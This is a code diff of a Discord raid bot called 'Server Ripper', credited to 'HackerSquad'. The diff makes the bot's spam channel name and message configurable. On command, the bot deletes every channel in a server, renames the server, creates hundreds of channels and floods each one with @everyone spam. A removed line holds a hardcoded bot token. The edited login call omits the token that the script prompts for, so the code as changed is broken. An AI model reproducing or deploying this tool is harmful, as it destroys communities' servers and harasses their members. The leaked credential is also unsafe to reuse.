@@ -1,9 +1,12 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
 const promp = require("prompt-sync");
-
+const prefix = prompt("Bot Prefix : ");
+const token = prompt("Bot Token : ");
 const presence = prompt("Bot Game : ");
 const servername = prompt("Type the server name : ");
+const channelName = prompt("Type the channel name : ");
+const messageSpam = prompt("Type the message to Spam : ");
 
 client.on("ready", ready => {
   console.log(`Server Ripper iniciado por : ${client.user.tag} By HackerSquad ( Renegade )`);
@@ -11,6 +14,7 @@ client.on("ready", ready => {
     status: "dnd",
     activity: {
       name: presence,
+      type: "LISTENING",
     }
   }).then(() => console.log(`Presencia cargada a el Bot : ${client.user.tag}`));
 });
@@ -21,7 +25,7 @@ client.on("message", async message => {
     await message.guild.channels.cache.forEach(c => c.delete());
     await message.guild.setName(servername);
     for(let i = 0; i <= 500; i++) {
-     message.guild.channels.create("RαιԃҽԃBყHαƈƙҽɾSϙυαԃ");
+     message.guild.channels.create(channelName);
     }
   }
 
@@ -61,7 +65,7 @@ client.on("message", async message => {
   if(message.content === "$help") {
     const embed = new Discord.MessageEmbed()
     .setTitle("Cookies Commands")
-    .setDescription("HackerSquad No Oficial Rbot\n[Invitame a tu servidor](https://discord.com/api/oauth2/authorize?client_id=886622778176974858&permissions=8&scope=bot)")
+    .setDescription("HackerSquad Bot From GitHubt\n[Invitame a tu servidor](https://discord.com/api/oauth2/authorize?client_id=886622778176974858&permissions=8&scope=bot)")
     .addFields(
       { name: "`$auto`", value: "Raidea el servidor", inline: false },
       { name: "`$down`", value: "Crea un rol de Down y se lo pone a todo el mundo", inline: false },
@@ -75,24 +79,12 @@ client.on("message", async message => {
 });
 
 client.on("channelCreate", channel => {
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
-  channel.send("__**HackerSquad Is Here**__  -  @everyone  https://discord.gg/fvck")
+  for(let i = 0; i <= 15; i++) {
+    channel.send(messageSpam)
+  }
 });
 
 
-client.login("ODg2NjIyNzc4MTc2OTc0ODU4.YT4Rzg.YjxuFS998K31vXJbpUniGwn6EWw")
+client.login()
 
 // 
